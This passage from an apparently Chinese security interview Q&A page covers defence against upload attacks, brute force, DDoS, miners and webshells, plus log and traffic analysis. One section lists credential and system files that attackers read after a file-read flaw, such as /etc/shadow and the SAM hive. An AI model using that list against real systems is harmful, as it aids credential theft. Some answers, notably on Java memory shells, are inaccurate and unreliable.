服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li><li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li><li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li><li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li></ol><p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p><hr><h2 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a>文件上传攻击特征？</h2><p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p><ol><li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li><li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li><li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li><li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li><li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li></ol><p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p><h2 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a>文件上传加固方法？</h2><p>以下是保护您的网站免受文件上传攻击的一些方法：</p><ol><li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li><li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li><li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li><li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li><li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li><li>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</li><li>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</li></ol><p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p><h2 id="暴力破解加固方法？"><a href="#暴力破解加固方法？" class="headerlink" title="暴力破解加固方法？"></a>暴力破解加固方法？</h2><p>以下是一些保护您的网站免受暴力破解攻击的方法：</p><ol><li>密码策略：实施强密码策略，建议用户使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</li><li>账户锁定：限制密码尝试次数，并在多次失败后自动锁定账户。同时，应该通过邮件或短信通知用户他们的账户已被锁定，以防止攻击者对其进行进一步攻击。</li><li>人机验证：在登录页面引入验证码或其他形式的人机验证，以防止自动化破解程序的攻击。</li><li>访问控制：实施访问控制策略，限制只有授权用户才能够访问敏感信息或功能。而且还应该限制来自未知来源或具有恶意行为的IP地址的访问。</li><li>强制退出：如果用户长时间没有活动，应强制退出登录状态，以防止攻击者通过利用未注销的会话进行攻击。</li><li>检测异常行为：检测异常登录行为，如从异常地区或设备登录，或频繁更改登录IP地址等。</li><li>安全日志审计：监控并记录登录事件，并对日志进行审计和分析，以便及时发现异常行为并采取措施。</li></ol><p>总之，在防止暴力破解攻击方面，需要综合考虑多种因素，包括密码策略、账户锁定、人机验证、访问控制、强制退出、检测异常行为等。同时，应保持应用程序的更新，及时修补安全漏洞，以确保系统的完整性和安全性。</p><h2 id="DDOS-CC等攻击应急思路以及如何防范"><a href="#DDOS-CC等攻击应急思路以及如何防范" class="headerlink" title="DDOS CC等攻击应急思路以及如何防范"></a>DDOS CC等攻击应急思路以及如何防范</h2><p>DDoS（分布式拒绝服务攻击）和 CC（HTTP）攻击是目前比较普遍的网络攻击方式之一。以下是应急响应思路以及如何防范这些攻击的建议：</p><ol><li>应急响应思路</li></ol><p>在受到DDoS和CC攻击时，应采取以下措施来降低攻击对系统的影响：</p><ul><li>快速检测并确认攻击类型和攻击源；</li><li>提高带宽和资源利用率，以提供更强的承载能力；</li><li>实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量；</li><li>配合 ISP 进行攻击源 IP 的追踪和协助；</li><li>在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。</li></ul><ol><li>如何防范</li></ol><p>为了预防DDoS和CC攻击，可以采取以下方法：</p><ul><li>增加网络带宽，并提高硬件设备的承载能力，以抵御较小规模的攻击；</li><li>实现DDoS和CC攻击的检测和防御机制，如基于流量和行为的检测技术和防御技术；</li><li>确保服务器和网站软件及时更新，以弥补已知漏洞；</li><li>实施流量清洗、流量限制和IP封堵等措施；</li><li>配置合理的防火墙规则和入侵检测系统（IDS）等安全设备；</li><li>加强网络安全教育，提高用户密码安全性，并定期对敏感数据进行备份和加密。</li></ul><p>总之，在防范DDoS和CC攻击方面，需要综合考虑多种因素，包括增加带宽、提高硬件承载能力、实现攻击检测和防御机制、确保服务器和网站软件及时更新、加强网络安全教育等。同时，应该建立完善的应急响应机制和紧急处理预案，以做好应急响应准备和快速响应。</p><h2 id="挖矿病毒判断以及处理方式"><a href="#挖矿病毒判断以及处理方式" class="headerlink" title="挖矿病毒判断以及处理方式"></a>挖矿病毒判断以及处理方式</h2><p>挖矿病毒是指利用受感染的计算机进行加密货币挖矿的恶意软件。以下是判断和处理挖矿病毒的一些方法：</p><ol><li>判断挖矿病毒</li></ol><p>通过以下迹象可以判断计算机是否被感染了挖矿病毒：</p><ul><li>计算机运行速度变慢，CPU占用率高；</li><li>电脑风扇声音变大，温度升高；</li><li>安全软件报告未知病毒或恶意软件；</li><li>系统出现闪退或死机等异常情况。</li></ul><ol><li>处理方式</li></ol><p>如果怀疑计算机已经被感染了挖矿病毒，可以采取以下措施：</p><ul><li>及时更新杀毒软件，并开启实时保护模式；</li><li>扫描整个系统，清除所有恶意文件和注册表项；</li><li>禁止不明程序自启动，及时关闭被感染的进程；</li><li>在安装软件时仔细阅读许可协议，禁止安装未知来源的软件；</li><li>加强账户权限管理，限制非管理员用户对系统的操作权限；</li><li>及时备份重要文件，以便在恶意软件攻击后恢复数据。</li></ul><p>总之，在处理挖矿病毒方面，需要及时发现和清除感染，并加强系统的安全防护措施，如升级杀毒软件、限制非管理员用户权限、备份重要文件等。同时，也需要加强网络安全教育，提高用户对于计算机安全的意识和防范能力。</p><h2 id="服务器存在-webshell，如何处理？"><a href="#服务器存在-webshell，如何处理？" class="headerlink" title="服务器存在 webshell，如何处理？"></a>服务器存在 webshell，如何处理？</h2><p>Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作。以下是处理服务器存在Webshell的一些方法：</p><ol><li>扫描和确认Webshell</li></ol><p>可以通过查看Web服务器日志或使用安全扫描工具来确认是否存在Webshell。找出所有可疑文件并进行彻底检查，以确定是否存在Webshell。</p><ol><li>删除Webshell</li></ol><p>如果确定存在Webshell，需要立即将其删除，并对系统进行全面清理。删除Webshell时，应同时清除与Webshell相关的文件和目录，并且应用程序代码也需要进行更新和修复。</p><ol><li>加强安全防护措施</li></ol><p>为了避免服务器再次被感染，需要加强安全防护措施，包括加强服务器的监控和日志审计、安装杀毒软件并定期更新、限制非管理员用户权限等。</p><ol><li>修改密码</li></ol><p>修改服务器管理员的账户密码，并确保强密码策略得到实施，建议使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</p><ol><li>更新和修复应用程序代码</li></ol><p>Webshell通常是由于应用程序存在漏洞或安全问题而被植入的。因此，为了防止类似问题再次发生，需要及时更新并修复应用程序代码中的安全漏洞。</p><p>总之，在处理服务器存在Webshell的问题时，需要快速准确地识别和清除Webshell，并加强服务器和应用程序的安全防护措施。同时，也需要定期进行巡检和审计，及时发现和排除漏洞，以确保系统的完整性和安全性。</p><h2 id="排查-shell-应该用什么命令来进行排查？"><a href="#排查-shell-应该用什么命令来进行排查？" class="headerlink" title="排查 shell 应该用什么命令来进行排查？"></a>排查 shell 应该用什么命令来进行排查？</h2><p>要排查 shell 的问题，可以使用以下命令：</p><ol><li><code>echo</code>：用于打印变量或字符串，可以用来检查变量的值是否正确。</li><li><code>set</code>：用于显示所有的 shell 变量和函数，包括环境变量。</li><li><code>env</code>：用于显示当前 shell 环境下的所有环境变量。</li><li><code>source</code> 或 <code>.</code>：用于读取并执行指定文件中的命令，通常用于重新加载配置文件。</li><li><code>sh -x script.sh</code>：用于以调试模式执行脚本，并输出每个执行的命令及其参数。</li><li><code>ps</code>：用于列出当前正在运行的进程，可以使用 <code>ps aux</code> 查看详细信息。</li><li><code>top</code>：用于实时查看系统资源的使用情况，可以用来定位占用 CPU 或内存过高的进程。</li><li><code>grep</code>：用于搜索指定的文本内容，可以用来查找特定日志文件中的错误信息等。</li></ol><p>这些命令可以帮助您快速诊断 shell 中的问题。</p><h2 id="如何检测-webshell？"><a href="#如何检测-webshell？" class="headerlink" title="如何检测 webshell？"></a>如何检测 webshell？</h2><p>Webshell是指嵌入到Web服务器上的一种命令执行环境，可以通过Web页面或HTTP协议与其进行交互，攻击者可以利用Webshell来执行各种恶意操作。检测Webshell可以使用以下几种方法：</p><ol><li>查看Web服务器访问日志：Webshell通常会产生异常的网络流量，例如向非标准端口发送POST请求等。查看Web服务器的访问日志，观察是否存在异常的请求。</li><li>安全扫描工具：使用安全扫描工具对Web服务器进行扫描，以检测是否存在Webshell。常用的安全扫描工具包括Nessus、OpenVAS等。</li><li>文件监控：Webshell通常会将恶意代码写入某个文件中，因此可以通过文件监控工具来检测Webshell。例如，当文件被修改时，文件监控工具会立即发送警报。</li><li>内存监控：有些高级的Webshell可能不会在磁盘上留下任何痕迹，而是直接将代码注入到内存中。因此，可以使用内存监控工具来检测是否存在Webshell。</li><li>安全审计：对Web服务器进行安全审计，检查是否存在安全漏洞，例如文件上传漏洞、命令注入漏洞等。攻击者通常会利用这些漏洞来上传Webshell。</li></ol><p>以上方法并不能完全保证检测到所有的Webshell，因此建议在Web服务器上部署安全防护解决方案，定期进行安全扫描和审核，并及时更新软件补丁。</p><h2 id="一台主机在内网进行横向攻击，你应该怎么做？"><a href="#一台主机在内网进行横向攻击，你应该怎么做？" class="headerlink" title="一台主机在内网进行横向攻击，你应该怎么做？"></a>一台主机在内网进行横向攻击，你应该怎么做？</h2><p>如果一台主机在内网进行横向攻击，建议采取以下措施：</p><ol><li>隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。</li><li>停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。</li><li>收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。</li><li>清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。</li><li>升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。</li><li>取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。</li><li>加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。</li></ol><p>总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。</p><h2 id="常见端口及其漏洞有哪些？"><a href="#常见端口及其漏洞有哪些？" class="headerlink" title="常见端口及其漏洞有哪些？"></a>常见端口及其漏洞有哪些？</h2><p>以下是常见的端口及其漏洞：</p><ol><li>端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。</li><li>端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</li><li>端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。</li><li>端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</li><li>端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。</li><li>端口 80/443（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。</li><li>端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</li><li>端口 139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</li><li>端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</li></ol><p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p><h2 id="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"><a href="#你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？" class="headerlink" title="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"></a>你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？</h2><p>当我分析数据包或者日志时，通常会采用如下的思路：</p><ol><li>收集数据包或日志文件：首先需要收集相关的数据包或日志文件，以便后续分析。</li><li>过滤和提取关键信息：对于大量的数据包或日志，需要通过过滤和提取关键信息的方式来缩小分析范围。例如，可以使用Wireshark的过滤器或grep命令来筛选出特定协议、IP地址等关键信息。</li><li>分析数据包或日志：根据需求进行数据包或日志的分析，并尝试从中发现异常或可疑行为。例如，可以查找异常的流量模式、不寻常的端口、频率异常的请求等。</li><li>确认问题并记录结论：在分析过程中，需要确认是否存在安全问题，并记录所得到的结论。</li><li>对问题进行修复和防范：最后，需要针对分析结果采取相应的措施，例如修补漏洞、加强访问控制、优化安全策略等，以降低风险和增强安全性。</li></ol><p>在这个过程中，我可能会使用以下一些工具和网站：</p><ul><li>Wireshark：网络数据包分析工具，用于捕获和分析网络数据包。</li><li>ELK Stack：用于日志管理和分析的综合解决方案，包括Elasticsearch、Logstash和Kibana。</li><li>grep命令：用于在文本文件中搜索特定模式的字符串。</li><li>WHOIS查询工具：用于查询域名的注册信息。</li><li>端口扫描工具：例如nmap，用于识别目标主机上开放的端口和服务。</li><li>CVE漏洞数据库：用于查询已知漏洞的详细信息。</li><li>OWASP Top 10：一个常见的Web应用程序安全风险排名列表，用于参考Web应用程序是否存在常见的安全问题。</li></ul><p>需要注意的是，分析过程中所用到的工具和网站因情况而异，具体根据实际需求进行选择。</p><h2 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h2><p>当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：</p><ol><li>对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。</li><li>确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。</li><li>使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。</li><li>定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。</li><li>进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。</li><li>采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。</li></ol><p>需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。</p><h2 id="如何查看系统内存-shell"><a href="#如何查看系统内存-shell" class="headerlink" title="如何查看系统内存 shell"></a>如何查看系统内存 shell</h2><p>我们可以通过使用一些命令来查看系统内存的使用情况。以下是一些常用的命令：</p><ol><li>free：用于显示当前系统的内存使用情况，包括已用内存、空闲内存、缓冲区内存和交换分区内存等。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">$ free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           7.8G        3.4G        289M         88M        4.1G        4.0G</span><br><span class="line">Swap:          2.0G        895M        1.1G</span><br></pre></td></tr></table></figure><ol><li>top：用于实时监视进程的运行状态，包括CPU和内存的使用情况。在 top 命令中，我们可以按 M 键排序以查看占用内存较多的进程。</li><li>ps：用于列出正在运行的进程，可以结合其他的选项来查看进程的详细信息，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">$ ps aux --sort=-%mem | head</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.1 225804 11356 ?        Ss   05:30   0:01 /sbin/init splash</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>以上命令都是在命令行环境下执行的。如果要图形化地查看系统内存使用情况，可以使用 GNOME 系统监视器（gnome-system-monitor）或 KDE 系统监视器（ksysguard）等工具，在图形化界面中方便地查看系统内存的使用情况和进程信息。</p><p>需要注意的是，当我们在 shell 中查看内存使用情况时，不要随意终止或杀死系统进程，否则可能会导致不可预估的后果。</p><h2 id="不安全的第三方组件的漏洞如何做前置规避？"><a href="#不安全的第三方组件的漏洞如何做前置规避？" class="headerlink" title="不安全的第三方组件的漏洞如何做前置规避？"></a>不安全的第三方组件的漏洞如何做前置规避？</h2><p>以下是一些规避不安全的第三方组件漏洞的前置方法：</p><ol><li>筛选可靠的第三方组件：在选择和采用第三方组件时，应该尽量选择那些经过广泛使用和审查、开源社区活跃、有明确维护计划等因素使人们信任的组件。此外还可以参考其他用户反馈、评测结果等对第三方组件进行评估。</li><li>定期更新组件版本：及时更新第三方组件以修复已知漏洞是很重要的。因此，需要定期检查并更新使用的第三方组件。</li><li>加强访问控制：为了防止黑客攻击通过不安全的第三方组件进入系统，需要加强访问控制，例如限制只有授权用户才能访问系统。</li><li>实施安全策略：实施相关的安全策略，如深度防御、安全审计等，以提高系统的安全性。</li><li>停用不必要的功能：如果某个第三方组件包含多个功能，但仅有部分功能被系统所用到，建议将未使用的功能关闭或移除，从而减少系统被攻击的风险。</li><li>使用漏洞扫描工具进行检测：使用漏洞扫描工具对系统中的第三方组件进行定期检测，及时发现已知漏洞并修复。</li></ol><p>需要注意的是，在前置规避不安全的第三方组件漏洞时，不能完全依赖于单一的措施。相反，应该采用多种手段来提高系统的安全性，从而避免被攻击者利用不安全的第三方组件漏洞进行攻击。</p><h2 id="Java-内存马排查有了解吗"><a href="#Java-内存马排查有了解吗" class="headerlink" title="Java 内存马排查有了解吗"></a>Java 内存马排查有了解吗</h2><p>Java内存马，也称为Java远程代码执行漏洞，是一种利用Java反序列化漏洞的攻击方式。攻击者可以通过构造恶意的序列化对象，将其发送给目标服务器并触发反序列化操作，从而在目标服务器上执行任意代码。以下是几种排查Java内存马的方法：</p><ol><li>追踪日志文件：如果系统已经被攻击，应该首先检查系统的日志文件，查找异常的请求或响应内容，并结合其他的信息确定是否存在Java内存马。</li><li>检查网络流量：可以使用Wireshark等网络抓包工具来监视服务器的网络流量，并分析报文中的数据内容，查找是否存在异常的Java序列化数据。</li><li>检查反序列化漏洞：Java内存马利用了Java反序列化漏洞，因此我们可以使用一些反序列化漏洞扫描工具（如 ysoserial）来检测系统是否受到这类漏洞的影响，并及时修补漏洞。</li><li>检查系统进程：Java内存马通常会在目标服务器上启动一个新的进程来执行恶意代码，因此可以通过检查系统进程列表，查找是否存在不明确的、异常的进程。</li><li>安装安全软件：为了更好地保障系统的安全性，可以安装一些专业的安全软件，如杀毒软件、入侵检测系统（IDS）等，并定期进行扫描和审计。</li></ol><p>需要注意的是，在排查Java内存马时，应该综合使用多种方法来确定是否存在此类攻击。同时也要及时修补系统漏洞，加强访问控制，并采取其他措施提高系统的安全性。</p><h2 id="如何修改-WEB-端口？如果不能修改端口还有什么利用方法？"><a href="#如何修改-WEB-端口？如果不能修改端口还有什么利用方法？" class="headerlink" title="如何修改 WEB 端口？如果不能修改端口还有什么利用方法？"></a>如何修改 WEB 端口？如果不能修改端口还有什么利用方法？</h2><p>要修改 WEB 端口，需要在 Web 服务器的配置文件中修改端口号。以下是一些常见的 Web 服务器的端口修改方式：</p><ol><li>Apache：找到 Apache 的 httpd.conf 配置文件，编辑 Listen 指令即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">Listen 8080</span><br></pre></td></tr></table></figure><ol><li>Nginx：找到 Nginx 的 nginx.conf 配置文件，编辑 http 模块下的 listen 指令即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8080;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Tomcat：找到 Tomcat 的 server.xml 配置文件，编辑 Connector 指令中的 port 属性即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">           connectionTimeout=&quot;20000&quot;</span><br><span class="line">           redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure><p>如果不能修改端口，攻击者可能会尝试其他利用方法，如：</p><ol><li>尝试使用默认或者弱口令登录：许多 web 应用程序都有默认的用户名和密码，或者用户使用简单的密码。攻击者可以通过爆破等方式，尝试使用这些凭据登录系统。</li><li>利用已知漏洞进行攻击：攻击者可以通过利用已知的漏洞来攻击目标系统，例如，注入攻击、文件上传漏洞、跨站点脚本（XSS）漏洞等。</li><li>利用社工攻击：攻击者可以使用钓鱼邮件、欺诈电话等方式进行社交工程攻击，从而获得目标系统的访问凭据或者其他重要信息。</li></ol><p>为了防止这些攻击，我们应该采取一系列措施来加强系统安全。例如：</p><ol><li>使用复杂的密码和多因素身份验证，提高登录安全性。</li><li>及时更新软件版本和安全补丁，修复已知的漏洞。</li><li>限制访问权限，仅允许授权用户访问系统，并对不明来源的流量进行阻拦或监测。</li><li>部署入侵检测系统（IDS）或入侵防御系统（IPS），对入侵行为进行实时监测和防范。</li><li>定期进行漏洞扫描、安全审计等工作，及时发现并修补系统中存在的漏洞。</li></ol><h2 id="获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈"><a href="#获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈" class="headerlink" title="获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈"></a>获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈</h2><p>获得文件读取漏洞后，攻击者通常会尝试读取一些敏感信息，例如系统配置文件、数据库凭据、应用程序源代码等。以下是在 Linux 和 Windows 操作系统上，攻击者可能会尝试读取的一些文件：</p><ol><li>Linux</li></ol><ul><li>/etc/passwd：包含本地用户的账户信息。</li><li>/etc/group：包含用户组的信息。</li><li>/etc/shadow：保存本地用户密码哈希值的文件。</li><li>/etc/sudoers：保存 sudo 命令权限的文件。</li><li>/proc/net/tcp：包含当前正在运行的 TCP 连接信息。</li><li>/var/log/auth.log：包含系统中用户认证和授权的日志信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><ol><li>Windows</li></ol><ul><li>C:\Windows\system32\config\SAM：包含本地账户的哈希密码值。</li><li>C:\Windows\system32\config\SYSTEM：包含系统的配置信息。</li><li>C:\inetpub\wwwroot\web.config：包含 IIS 网站的配置信息。</li><li>C:\Program Files (x86)\MySQL\MySQL Server 5.7\my.ini：包含 MySQL 数据库的配置信息。</li><li>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys：包含机器级别的 RSA 密钥。</li><li>Event log 文件：攻击者可能会尝试读取操作系统事件日志文件，以查看系统的历史记录信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><p>为了防止文件读取漏洞的攻击，我们可以采取以下一些措施：</p><ol><li>限制访问权限：在操作系统、应用程序和网站中，应该合理设置安全访问策略，并对敏感信息和文件进行严格的权限控制。</li><li>加密重要文件：对重要文件进行加密处理，防止黑客获取有效信息。</li><li>安装入侵检测系统（IDS）：使用 IDS 系统来监测系统内部和外部的攻击行为。</li><li>监控日志：对系统中产生的日志进行定期审计和监控，及时发现异常情况并采取相应的措施。</li><li>及时修补漏洞：定期检查和更新系统、应用程序和第三方库的版本，以修复已知的漏洞。</li></ol><h2 id="如何分析被代理出来的数据流"><a href="#如何分析被代理出来的数据流" class="headerlink" title="如何分析被代理出来的数据流"></a>如何分析被代理出来的数据流</h2><p>被代理出来的数据流通常是由代理服务器拦截并转发的，可以借助代理工具（如 Burp Suite）等工具来对数据流进行分析。以下是一些可能的分析方法：</p><ol><li>拦截和重放请求：在代理工具中，我们可以通过拦截请求，并对其做出修改，然后再次发送请求到目标服务器上，从而观察应用程序如何响应这些请求。</li><li>查看请求和响应头信息：在代理工具中，我们可以查看 HTTP 请求和响应头信息，包括 cookies、User-Agent 等，以了解应用程序的行为。</li><li>分析 HTTP 响应体：代理工具能够捕获 HTTP 响应体，并显示在工具界面中，我们可以查看应用程序返回的 HTML、JavaScript、CSS、图片等内容，以便了解应用程序的结构和行为。</li><li>查找敏感信息：代理工具可以对所有的 HTTP 流量进行记录和分析，我们可以通过搜索敏感信息来查找密码、凭据等敏感信息是否泄露。</li><li>使用插件进行分析：代理工具通常具有各种插件，例如 XSS 扫描器、SQL 注入扫描器、漏洞扫描器等，可以使用这些插件来检测应用程序中的漏洞和安全风险。</li></ol><p>需要注意的是，在进行数据流分析时，必须遵守法律和道德规范，不得盗取或滥用他人信息。同时，对于代理工具捕获的敏感信息，一定要妥善保护，避免泄露给未授权的人员。</p><h2 id="查看-windows-进程的方法有哪些"><a href="#查看-windows-进程的方法有哪些" class="headerlink" title="查看 windows 进程的方法有哪些"></a>查看 windows 进程的方法有哪些</h2><p>以下是查看 Windows 进程的几种方法：</p><ol><li>任务管理器：可以通过打开任务管理器来查看当前正在运行的进程。在 Windows 10 中，可以使用快捷键 Ctrl + Shift + Esc 来打开任务管理器；在其他版本的 Windows 中，可以使用 Ctrl + Alt + Delete 快捷键，然后选择“任务管理器”来打开。</li><li>命令行工具：可以使用命令行工具（如 cmd 或 PowerShell）来查看进程。在命令行中输入“tasklist”命令，即可列出当前正在运行的所有进程及其相关信息。</li><li>系统资源监视器：系统资源监视器是一个 Windows 内置的性能监控工具，可以查看系统的 CPU 使用率、内存占用率、磁盘和网络活动等信息。同时，它还提供了一个进程列表，可以显示每个进程的 CPU 使用率、内存占用情况等详细信息。</li><li>第三方工具：除了 Windows 自带的工具外，还有许多第三方工具可以用来查看进程，如 Process Explorer、Process Hacker 等。这些工具通常提供更加详细的进程信息，并允许用户对进程进行调试和管理。</li></ol><p>无论使用哪种方法，对于一些可疑的进程，我们应该及时采取相应的措施，例如杀死进程、禁止其自启动等。同时，我们还应该注意保护系统安全，避免恶意进程的入侵和攻击。</p><h2 id="如何查看进程对应的程序位置"><a href="#如何查看进程对应的程序位置" class="headerlink" title="如何查看进程对应的程序位置"></a>如何查看进程对应的程序位置</h2><p>在 Windows 